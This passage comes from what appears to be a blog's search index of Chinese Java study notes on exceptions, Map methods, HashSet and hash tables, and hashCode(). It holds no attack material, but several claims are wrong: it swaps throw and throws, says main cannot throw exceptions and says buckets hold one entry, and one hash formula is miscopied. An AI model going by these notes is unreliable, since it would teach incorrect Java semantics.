href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><ul><li>printStackTrace()：输出发生异常时堆栈信息</li><li>getMessage()：获取发生异常时事件信息。</li></ul><br>## 自定义异常：Java 异常机制可以保证程序的健壮性和安全性。虽然 Java 提供了很多直接处理异常的类，但有时候需要更明确的捕获和处理异常，以呈现更好地用户体验，需要开发者自定义异常。1. 自定义异常，需要继承 Exception 类。<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">class 【自定义类名称】 extends Exception()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>2. 定义好自己的异常类后，使用工具生成构造器。<h3 id="throws-关键字："><a href="#throws-关键字：" class="headerlink" title="throws 关键字："></a>throw<strong>s</strong> 关键字：</h3><p>在某种特殊的情况下，程序员主动抛出某种特定的异常类型时，让上一层异常处理来捕获，可以使用 throws 关键字。</p><p>throws 是指 抛出一个具体的异常类型。<br>不能在 main 方法中抛异常！</p><h3 id="throw-关键字："><a href="#throw-关键字：" class="headerlink" title="throw 关键字："></a>throw 关键字：</h3><p>程序中会有很多方法，这些方法可能会因为某些错误而引发异常，但是你又不想进行处理，而希望通过调用者来进行统一的处理，这个时候可以用 throw 关键字声明这个<strong>方法</strong>会抛出异常。</p><p>throw 是用来声明一个方法可能会抛出某些异常。</p><pre class="line-numbers language-Jaava" data-language="Jaava"><code class="language-Jaava">方法名(参数...) throw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> Exception </tag>
            
            <tag> Error </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Map 映射</title>
      <link href="/2017/03/20/map/"/>
      <url>/2017/03/20/map/</url>
      
        <content type="html"><![CDATA[<p>映射（Map）是一种存放一组条目的容器，每个条目形如（key, value），其中 key 为关键码对象，value 为具体的数据对象。<strong>在映射中，各条目的关键码不允许重复冗余。</strong>映射中的元素由其关键码唯一标识，映射的作用是通过关键码直接找到对应的元素。</p><span id="more"></span><h2 id="Map-接口"><a href="#Map-接口" class="headerlink" title="Map (接口)"></a>Map (接口)</h2><p>Map 接口定义了存储所谓的 key-value，即键值对。Key 可以看成 value 索引，作为 key 的对象在 Map 中不可重复。</p><p>实现 Map 接口最常用的是 HashMap，TreeMap。Map 也支持泛型。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>映射的常用操作方法：</p><table><thead><tr><th align="center">操作方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">getSize()</td><td align="center">获得映射的规模，即其中元素的数目，返回值为 int 类型</td></tr><tr><td align="center">isEmpty()</td><td align="center">判断映射是否为空，返回值为 boolean 类型</td></tr><tr><td align="center">get(key)</td><td align="center">若映射中存在以 key 为关键码的条目，则返回该条目的数据对象，否则返回 nul</td></tr><tr><td align="center">put(key, value)</td><td align="center">若映射中不存在以 key 为关键码的条目，则将条目 (key, value) 加入到映射中并返回 null，否则，将已有条目的数据对象替换为 value，并返回原先的数据对象。</td></tr></tbody></table><h3 id="V-put-K-k-V-v"><a href="#V-put-K-k-V-v" class="headerlink" title="V put(K k, V v)"></a>V put(K k, V v)</h3><p>若 Map 中不存在以 key 为关键码的条目，则将条目 (key, value) 加入到映射中并返回 null，否则，将已有条目的数据对象替换为 value，并返回原先的数据对象。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"语文"</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"数学"</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"英语"</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"物理"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"化学"</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 {物理=100, 数学=99, 化学=88, 语文=60, 英语=59}</span><span class="token comment">//不允许重复</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"英语"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//m.put(2,"dsf");//报错，已经指定了泛型的类型</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="putAll-Map-m"><a href="#putAll-Map-m" class="headerlink" title="putAll(Map m)"></a>putAll(Map m)</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">m<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="get-Object-k"><a href="#get-Object-k" class="headerlink" title="get(Object k)"></a>get(Object k)</h3><p>根据给定的 key 获取对应的 value 对象，不存在则返回 null。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Integer</span> value <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"语文"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printLn</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//60</span>value <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"生物"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printLn</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="V-remove-K-k"><a href="#V-remove-K-k" class="headerlink" title="V remove(K k)"></a>V remove(K k)</h3><p>根据给定的 key 所对应的记录从 Map 中移除，并且将该删除成功后的 value 值返回。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">value <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"英语"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="int-size"><a href="#int-size" class="headerlink" title="int size()"></a>int size()</h3><p>返回 Map 中的元素个数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="void-clear"><a href="#void-clear" class="headerlink" title="void clear()"></a>void clear()</h3><p>该方法用于清空所有元素。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">m<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="boolean-containsKey-Object-key"><a href="#boolean-containsKey-Object-key" class="headerlink" title="boolean containsKey(Object key)"></a>boolean containsKey(Object key)</h3><p>判断 Map 中是否包含给定的 key，包含则返回 true，否则返回 false。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map 中是否包含 "</span> <span class="token operator">+</span> m<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token string">"英语"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map 中是否包含 "</span> <span class="token operator">+</span> m<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token string">"语文"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Set-keySet"><a href="#Set-keySet" class="headerlink" title="Set keySet()"></a>Set keySet()</h3><p>用于返回当前 Map 中所有的 key（键），存入一个 Set 集合。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> set <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Collection-values"><a href="#Collection-values" class="headerlink" title="Collection values()"></a>Collection values()</h3><p>用于返回当前 Map 中所有的 value（值），存入一个 Collection 集合。（因为 value 可以重复，所以不是 Set）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> c <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Set-lt-Entry-lt-K-V-gt-gt-entrySet"><a href="#Set-lt-Entry-lt-K-V-gt-gt-entrySet" class="headerlink" title="Set<Entry<K,V>> entrySet()"></a>Set&lt;Entry&lt;K,V&gt;&gt; entrySet()</h3><p><strong>会将当前 Map 中每一组 key-value 封装为一个 Entry 对象，并存入一个 Set 集合返回。</strong><br>也就是新的 Set 集合中每个元素都是一个 Entry 对象。每一个 Entry 对象都对应一个 key-value 键值对</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Entry</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> entry <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="遍历-Map"><a href="#遍历-Map" class="headerlink" title="遍历 Map"></a>遍历 Map</h2><p>遍历 Map 有三种方式：</p><ul><li>遍历所有的 key</li><li>遍历所有的 value<blockquote><p>不常用也不推荐用</p></blockquote></li><li>遍历每一组键值对（Entry）</li></ul><h3 id="遍历所有-key"><a href="#遍历所有-key" class="headerlink" title="遍历所有 key"></a>遍历所有 key</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"语文"</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"数学"</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"英语"</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"物理"</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"化学"</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> set <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token operator">:</span>set<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"key:"</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">",  value:"</span> <span class="token operator">+</span> m<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="遍历每一组键值对"><a href="#遍历每一组键值对" class="headerlink" title="遍历每一组键值对"></a>遍历每一组键值对</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Entry</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> entry <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> e<span class="token operator">:</span>entry<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//遍历 Set 集合，拿到每一个 Entry 对象</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"key:"</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",  value:"</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="遍历所有-value"><a href="#遍历所有-value" class="headerlink" title="遍历所有 value"></a><del>遍历所有 value</del></h3><p>不常用</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span> i<span class="token operator">:</span>m<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br># 坑有点大！稍后填坑！！！ #]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合 </tag>
            
            <tag> Map </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashSet 散列集</title>
      <link href="/2017/03/19/hashset/"/>
      <url>/2017/03/19/hashset/</url>
      
        <content type="html"><![CDATA[<p>链表和数组可以按照人们的意愿排列元素的次序，但是如果想要查看某个指定的元素，却又忘记了它的位置，就需要访问所有元素，直到找到为止。如果集合中包含的元素很多，将会消耗很多时间。</p><span id="more"></span><h2 id="Hash-Table-散列表"><a href="#Hash-Table-散列表" class="headerlink" title="Hash Table 散列表"></a>Hash Table 散列表</h2><p><strong>散列表（hash table）</strong>是一种以 <strong>键-值（key-indexed）</strong> 存储数据的结构，<strong>可以快速的查找所需要的对象</strong>。散列表为每个对象计算一个整数，成为[散列码（hash code）](/2017/03/18/HashCode 散列码/)。</p><p>在 Java 中，散列表用链表数组（又叫<strong>桶数组</strong>…）实现。每个列表被称为<strong>桶（bucket）</strong>。</p><p>桶数组其实就是一个容量为 N 的普通数组 A[0, 1, 2…N-1]，只不过在这里我们将每个单元都想象为一个“桶”，每个桶单元中可以存放一个条目。</p><p>比如，倘若所有的关键码（key）都是小于 N 的非负整数，我们就可以直接将 key 为关键码的那个条目（如果存在的话）存放在桶单元 A[key]内，为了节省空间，空闲的单元都被置为 null。由于 HashSet 底层是[映射](/2017/03/19/Map 映射/)结构，所以<strong>每个桶单元中最多只能存放一个条目。</strong>如此一来，查找、插入和删除操作都可以快速完成。</p><p>但是，这只是一种极为特殊的情况，通常往往不会这么碰巧。比如，这里很难确定数组的最佳容量 N，所以往往选用远大于映射实际规模 n 的某个 N：如果关键码都是 int 类型的非负整数，则至少需要 2 147 483 648 个桶单元，这远远超出了一般映射结构本身的规模，造成了空间的巨大浪费。</p><p>为了解决这个问题，就需要一个方法，可以将任意关键码转换为介于 0 与 N-1 之间的整数——这个函数就是散列函数。</p><br>## 散列函数- 散列函数 h 将关键码 key 映射为一个整数 h(key) ∈ [0...N-1]，并将对应的条目存放到 h(key) 号桶内，其中 N 为桶数组的容量。- 如果将桶数组记作 A[]，这一技术就可以总结为 “将条目 e = (key, value) 存放至 A[h(key)] 中”。- 反过来，为了查找关键码为 key 的条目，只需要取出桶单元 A[h(key)] 中存放的对象。- 因此，h(key) 也被称作 e 的散列地址。<blockquote><p>好吧，这里有点乱。如图，散列函数的计算划分为两步：</p></blockquote><p><img src="http://wx2.sinaimg.cn/mw690/a6e9cb00ly1fds4zpdrf5j20l10ca3zf.jpg" alt="Java 计算散列函数的过程"></p><ol><li>首先将一般性的关键码 key 转换为一个称作 “散列码” 的整数。</li><li>通过所谓的 “压缩函数” 将该整数 映射至区间 [0…N-1] 中。</li></ol><blockquote><p>不过，若要对线上述构思，还需要满足一个条件——不同的关键码 key1 ≠ key2 必须要对应于不同的散列地址 h(key1) ≠ h(key2)。<br>但是还是可能会无法满足该条件，如果不同关键码的散列地址相同，就会发生**[散列冲突（hash collision）](/2017/03/19/HashSet 散列集/#散列冲突)**</p></blockquote><br>### 散列码Java 可以帮助我们将任意类型的关键码 key 转换为一个整数，称作 key 的散列码（Hash Code）。超类 Object 提供了一个默认的散列码转换方法 [hashCode()](/2017/03/18/HashCode 散列码/)，利用它可以将任意对象实例映射为 “代表” 该对象的某个整数。<blockquote><p><strong>注意:<strong>散列码距离我们最终所需的散列地址还有很大距离——它不一定落在区间 [0…N-1] 内，甚至不一定是</strong>正</strong>整数。</p></blockquote><br>### 压缩函数如果直接将散列码作为桶数组的胆原地址，则桶的容量将达到 2^32 = 4 G！即使能够提供如此大的空间，其利用率也是极低的。因此就需要将散列码进一步压缩至我们希望的 [0...N-1] 区间内。<p>压缩函数有两种：【模余法】和【MAD 法】</p><p><strong>模余法压缩:</strong><br>最简单的压缩办法，就是**取 N 为素数，并将散列码 i 映射为： <code>|i| mod N</code>**。</p><p>之所以将 N 选为素数，是为了最大程度的将散列码均匀地映射至 [0…N-1] 区间内。若所有关键码都是在 [0…N-1]内随机均匀分布的，则其中每一对关键码发生冲突的概率都是 1/N。</p><p>因此，月石能够使得这个概率接近于 1/N，我们选用的散列函数就越好。</p><p><strong>MAD 法：</strong><br>模余法是一个简单易行的策略，但如果关键码的分布具有 aN + b 的模式(啊~这模式我也没懂，先了解吧，以后明白了回来补上…)，则仍然会发生不少冲突。<br>因此，可以采用另一种方法，将乘法（Mutiply）、加法（Add）和除法（Divide）结合起来的方法，该方法也因此得名。<br>**对于散列码 i，MAD 法会将 i 映射为 <code>|a*i + b| mod N</code>**。<br>其中 N 仍为素数，a &gt; 0，b &gt; 0，a mod N ≠ 0，它们都是在确定压缩函数时随机选取的常数。</p><br>## 散列冲突在插入元素时，两个不同对象的散列码一样，导致不同关键码的散列地址相同，就会导致散列冲突。不管怎样，散列冲突的可能性总是存在的。<p>如果大致知道最终会有多少个元素要插入到散列表中，就可以设置桶数，一般将桶数设置为预计元素个数的 75%~150%。<br>但是，并不是总能够知道需要存储多少个元素的。也可能最初的估计过低。</p><p>如果散列表太满，就需要<strong>再散列</strong>，就需要创建一个桶数更多的表，并将所有元素插入到这个新表中，然后丢弃原来的表。</p><p><strong>装填因子（load factor）</strong>决定何时对散列表进行再散列。例如，如果装填因子为 0.75(默认值)，而表中超过 75% 的位置已经填入元素，这个表就会用<strong>双倍</strong>的桶数自动的进行再散列。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 集合 </tag>
            
            <tag> HashSet </tag>
            
            <tag> HashTable </tag>
            
            <tag> Set </tag>
            
            <tag> 哈希表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hash Code 散列码</title>
      <link href="/2017/03/18/hashcode/"/>
      <url>/2017/03/18/hashcode/</url>
      
        <content type="html"><![CDATA[<p><strong>散列码（hash code）散列码是由对象的实例域产生的一个整数</strong>。更准确的说,<strong>具有不同数据域的对象将产生不同的散列码。</strong>散列码是没有规律的。如果 x 和 y 是两个不同的对象，x.hashCode() 与 y.hashCode() 基本上不会相同。</p><span id="more"></span><h2 id="hashCode-方法"><a href="#hashCode-方法" class="headerlink" title="hashCode() 方法"></a>hashCode() 方法</h2><p>hashCode() 方法就是获取该对象散列码的方法，hashCode() 方法定义在 Object 类中，因此每个对象都有一个默认的散列码，其值为对象的存储地址。<br>但是很多类都需要重写获取散列码的方法，例如：String 类中使用下面的算法计算散列码（<strong>散列函数</strong>）：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> hash<span class="token punctuation">;</span><span class="token comment">//默认为 0</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">int</span> h <span class="token operator">=</span> hash<span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> value<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//这里计算 hash code</span>           <span class="token keyword">char</span> val<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>           <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> value<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               h <span class="token operator">=</span> <span class="token number">31</span> <span class="token operator">*</span> h <span class="token operator">+</span> val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>           hash <span class="token operator">=</span> h<span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span> h<span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>计算字符串散列码的公式为：<br>$ h = val[0]·31^(L-1) + … + val[L-3]·31^2 + val[L-2]·31^1 + val[L-1]·31^0 $<br>举个例子，获取 “call” 的散列码：<br>字符 c 对应的 unicode 为 99，a 对应的 unicode 为 97，l 对应的 unicode 为 108，所以字符串 “call” 的哈希值为<br>$ 3045982 = 99 · 31^3 + 97 · 31^2 + 108 · 31^1 + 108 · 31 = 108 + 31 · (108 + 31 · (97 + 31 · 99)) $</p></blockquote><p>由于 hashCode 方法定义在 Object 类中，因此每个对象都有一个默认的散列码，其值为对象的存储地址。通过下面这段代码对比一下 String 和 StringBuilder 的散列码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"Ok"</span><span class="token punctuation">;</span><span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> sb<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 2556 366712642</span><span class="token class-name">String</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"Ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StringBuilder</span> tb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token 